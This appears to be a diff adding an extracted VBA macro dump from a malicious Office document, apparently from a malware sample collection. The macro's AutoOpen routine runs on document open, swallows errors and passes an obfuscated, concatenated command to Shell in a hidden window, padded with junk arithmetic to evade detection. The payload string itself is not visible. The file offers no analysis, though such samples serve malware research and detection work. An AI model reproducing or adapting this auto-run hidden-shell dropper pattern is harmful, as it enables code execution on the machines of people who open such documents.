@@ -1,0 +1,39 @@
+Filename     : ./macros/6c80ee3f414b1bca20920b76ee47392dc9f73146efa816a52eff7ac5a2a22136
+OLE stream   : Macros/VBA/iFjDzREEwwOsZ
+VBA filename : iFjDzREEwwOsZ.cls
+----------------------------------------
+Attribute VB_Name = "iFjDzREEwwOsZ"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Function inOYZpZbA()
+On Error Resume Next
+kSUvYz = Fix(17543 / CSng(4662) * AUHAkJ * idqLz)
+VhBn = CDate(1534)
+vjGOwM = Fix(55373 / CSng(18164) * DLJdI * vcjCPz)
+VhBn = CDate(97451)
+inOYZpZbA = ffBDsrAVN + HWcBzUvV + lYEXBd + IZFTdQQ + VXcwzOQdrO + Vvqnd + AMTWlN + VtCKplYV + Uvmibf + WuFsQjtU + VzjQrN + nnYHlM + HoaiiwCQfJn
+TPhji = Fix(21695 / CSng(56777) * jkWZMS * MpFrOE)
+VhBn = CDate(79945)
+End Function
+Sub Autoopen()
+On Error Resume Next
+ftAhOb = Fix(93385 / CSng(71366) * whmzPd * wcUiZG)
+VhBn = CDate(66892)
+FrStilC (inOYZpZbA)
+ctXMK = Fix(16269 / CSng(68841) * doBpdd * GjzZd)
+VhBn = CDate(58593)
+End Sub
+Function FrStilC(bsOAHXHiCp)
+On Error Resume Next
+jwMGsm = Fix(68274 / CSng(20353) * ZKjEV * jaoMk)
+VhBn = CDate(17594)
+rhnIWkbQfPp = YprmzwLatt + Shell(MQEYbqLTjsP + Chr(vbKeyP) + ozTWd + bsOAHXHiCp, vbHide)
+OoVUN = Fix(27303 / CSng(91298) * jFnwJa * DPzNT)
+VhBn = CDate(77227)
+End Function
+
